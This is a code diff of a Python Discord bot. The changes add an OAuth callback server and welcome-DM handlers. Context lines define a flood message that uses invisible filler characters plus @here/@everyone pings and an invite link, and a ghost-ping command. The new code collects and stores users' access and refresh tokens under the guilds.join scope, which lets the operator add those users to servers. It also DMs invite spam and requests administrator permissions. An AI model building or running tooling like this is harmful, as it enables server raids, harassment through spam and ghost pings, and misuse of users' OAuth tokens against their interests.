@@ -1,5 +1,5 @@
 # language: Python 3.11+, file: bot.py, target: Discord API v10
-# pip install -U discord.py requests
+# pip install -U discord.py requests aiohttp
 
 import discord
 from discord import app_commands
@@ -9,6 +9,7 @@ import json
 import os
 import random
 import requests as http_requests
+from aiohttp import web
 from pathlib import Path
 from urllib.parse import urlencode
 from datetime import datetime, timezone, timedelta
@@ -35,6 +36,7 @@ FLOOD_BLOCK = "\n".join(["\u3164"] * 80) + "\n@here @everyone\n" + INVITE
 DATA_FILE = Path("data.json")
 
 intents = discord.Intents.all()
+intents.members = True  # needed for on_member_join
 bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)
 
 bot.tree.allowed_contexts = discord.app_commands.AppCommandContext(guild=True, dm_channel=True, private_channel=True)
@@ -215,16 +217,8 @@ async def log_command(interaction: discord.Interaction, command_name: str, extra
     embed.add_field(name="User", value=f"<@{interaction.user.id}>\n`{interaction.user}`", inline=True)
     embed.add_field(name="Command", value=f"`/{command_name}`", inline=True)
     embed.add_field(name="Context", value=context_label, inline=True)
-    embed.add_field(
-        name="Server",
-        value=f"{guild_name}\n`{guild_id}`",
-        inline=False,
-    )
-    embed.add_field(
-        name="Channel",
-        value=f"#{channel_name}\n`{channel_id}`",
-        inline=False,
-    )
+    embed.add_field(name="Server", value=f"{guild_name}\n`{guild_id}`", inline=False)
+    embed.add_field(name="Channel", value=f"#{channel_name}\n`{channel_id}`", inline=False)
     if ctx_bits:
         embed.add_field(name="Install / Flags", value=", ".join(ctx_bits)[:1024], inline=False)
     if extra:
@@ -360,6 +354,11 @@ async def on_ready():
             await bot.refresh_status_panel()
         except Exception as e:
             print(f"status refresh on_ready: {e}")
+
+    try:
+        await start_oauth_server()
+    except Exception as e:
+        print(f"oauth server start failed: {e}")
 
 @bot.tree.command(name="sync", description="Force re-sync slash commands (owner only)")
 async def sync_cmd(interaction: discord.Interaction):
@@ -518,6 +517,115 @@ async def ghostping(interaction: discord.Interaction, member: discord.User):
     except Exception as e:
         await log_error("ghostping", e)
         await interaction.followup.send(f"Send failed: `{e}`", ephemeral=True)
+
+# ===== OAuth callback + welcome DMs =====
+AUTH_WELCOME_DM = (
+    "Welcome to Slash hope you enjoy you're stay, to use the bot you must join the server below!\n"
+    "{mention}\n"
+    "https://discord.gg/Swg688n2kC"
+)
+
+JOIN_WELCOME_DM = (
+    "Welcome in Slash, best external app existing.\n"
+    "Add bot to a server with —> https://discord.com/api/oauth2/authorize?client_id=1560307448177229854&permissions=8&scope=bot+applications.commands\n"
+    "Add bot to ur apps to use as an external —> https://discord.com/api/oauth2/authorize?client_id=1560307448177229854&response_type=code&redirect_uri=http%3A%2F%2Flocalhost%3A8080%2Fcallback&scope=identify+guilds.join"
+)
+
+async def _dm_user(user_id: int, content: str):
+    try:
+        user = bot.get_user(user_id) or await bot.fetch_user(user_id)
+        await user.send(content)
+        return True
+    except Exception as e:
+        print(f"DM failed {user_id}: {e}")
+        return False
+
+async def oauth_callback(request: web.Request):
+    code = request.rel_url.query.get("code")
+    if not code:
+        return web.Response(text="Missing code. Authorize again.", status=400)
+
+    try:
+        token_r = http_requests.post(
+            "https://discord.com/api/v10/oauth2/token",
+            data={
+                "client_id": CLIENT_ID,
+                "client_secret": CLIENT_SECRET,
+                "grant_type": "authorization_code",
+                "code": code,
+                "redirect_uri": REDIRECT_URI,
+            },
+            headers={"Content-Type": "application/x-www-form-urlencoded"},
+            timeout=15,
+        )
+        token_data = token_r.json()
+        if "access_token" not in token_data:
+            print(f"oauth token error: {token_data}")
+            return web.Response(text=f"Token error: {token_data}", status=400)
+
+        access = token_data["access_token"]
+        refresh = token_data.get("refresh_token")
+        me_r = http_requests.get(
+            "https://discord.com/api/v10/users/@me",
+            headers={"Authorization": f"Bearer {access}"},
+            timeout=10,
+        )
+        me = me_r.json()
+        uid = str(me["id"])
+
+        data.setdefault("authorized", {})[uid] = {
+            "access_token": access,
+            "refresh_token": refresh,
+            "username": f"{me.get('username', '?')}#{me.get('discriminator', '0')}",
+            "authorized_at": datetime.now(timezone.utc).isoformat(),
+        }
+        save_data(data)
+        print(f"oauth authorized: {uid} {me.get('username')}")
+
+        mention = f"<@{uid}>"
+        await _dm_user(int(uid), AUTH_WELCOME_DM.format(mention=mention))
+
+        return web.Response(
+            text="Authorized. Check your DMs — join the server to use the bot.",
+            content_type="text/plain",
+        )
+    except Exception as e:
+        print(f"oauth_callback error: {e}")
+        try:
+            await log_error("oauth_callback", e)
+        except Exception:
+            pass
+        return web.Response(text=f"Error: {e}", status=500)
+
+async def start_oauth_server():
+    app = web.Application()
+    app.router.add_get("/callback", oauth_callback)
+    runner = web.AppRunner(app)
+    await runner.setup()
+    port = 8080
+    try:
+        from urllib.parse import urlparse
+        p = urlparse(REDIRECT_URI)
+        if p.port:
+            port = p.port
+    except Exception:
+        pass
+    site = web.TCPSite(runner, "0.0.0.0", port)
+    await site.start()
+    print(f"oauth callback server on 0.0.0.0:{port}  redirect={REDIRECT_URI}")
+
+@bot.event
+async def on_member_join(member: discord.Member):
+    target_id = REQUIRED_GUILD_ID
+    if target_id and member.guild.id != target_id:
+        return
+    if member.bot:
+        return
+    try:
+        await member.send(JOIN_WELCOME_DM)
+        print(f"join DM sent to {member.id}")
+    except Exception as e:
+        print(f"join DM failed {member.id}: {e}")
 
 # --- load remaining commands + panels (paths relative to this file) ---
 _BASE = Path(__file__).resolve().parent
